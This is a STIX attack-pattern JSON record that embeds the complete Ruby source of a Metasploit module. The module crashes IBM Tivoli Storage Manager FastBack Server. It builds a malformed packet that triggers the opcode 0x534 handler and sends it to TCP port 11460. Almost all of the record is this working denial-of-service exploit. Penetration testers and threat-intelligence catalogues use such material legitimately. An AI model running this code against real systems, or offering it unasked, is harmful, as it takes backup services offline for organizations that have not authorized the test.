{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--44ff1bce-aa70-42ad-971f-cb7f08b2ebc8",
    "created": "2024-08-14T16:24:52.978417Z",
    "modified": "2024-08-14T16:24:52.978421Z",
    "name": "\"IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service\"",
    "description": " This module exploits a denial of service condition present in IBM Tivoli Storage Manager FastBack Server when dealing with packets triggering the opcode 0x534 handler.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/misc/ibm_tsm_dos.rb",
            "external_id": "ibm_tsm_dos.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service\",\n      'Description'    => %q{\n          This module exploits a denial of service condition present in IBM Tivoli Storage Manager\n          FastBack Server when dealing with packets triggering the opcode 0x534 handler.\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Gianni Gnesa',                              # Public disclosure/Proof of Concept\n          'William Webb <william_webb[at]rapid7.com>', # Metasploit\n        ],\n      'References'     =>\n        [\n          ['EDB', '38979'],\n          ['OSVDB', '132307']\n        ],\n      'DisclosureDate' => '2015-12-15',\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(11460)\n      ])\n  end\n\n  def tv_pkt(opcode, p1=\"\", p2=\"\", p3=\"\")\n    buf = Rex::Text.rand_text_alpha(0x0C)\n    buf += [opcode].pack(\"V\")\n    buf += [0x00].pack(\"V\")\n    buf += [p1.length].pack(\"V\")\n    buf += [p1.length].pack(\"V\")\n    buf += [p2.length].pack(\"V\")\n    buf += [p1.length + p2.length].pack(\"V\")\n    buf += [p3.length].pack(\"V\")\n\n    buf += Rex::Text.rand_text_alpha(0x08)\n\n    buf += p1\n    buf += p2\n    buf += p3\n\n    pkt = [buf.length].pack(\"N\")\n    pkt << buf\n\n    return pkt\n  end\n\n  def run\n    target_opcode = 0x534\n    connect\n    print_status(\"Connected to: #{rhost} port: #{rport}\")\n    print_status(\"Sending malicious packet\")\n\n    p = tv_pkt(target_opcode,\n               \"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d\" % [Rex::Text.rand_text_alpha(0x200),0,0,0,0],\n               Rex::Text.rand_text_alpha(0x60),\n               Rex::Text.rand_text_alpha(0x60)\n              )\n\n    sock.put(p)\n    print_status(\"Packet sent!\")\n  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => ex\n    print_error(\"Exploit failed: #{ex.class} #{ex.message}\")\n    elog(ex)\n  ensure\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-15"
}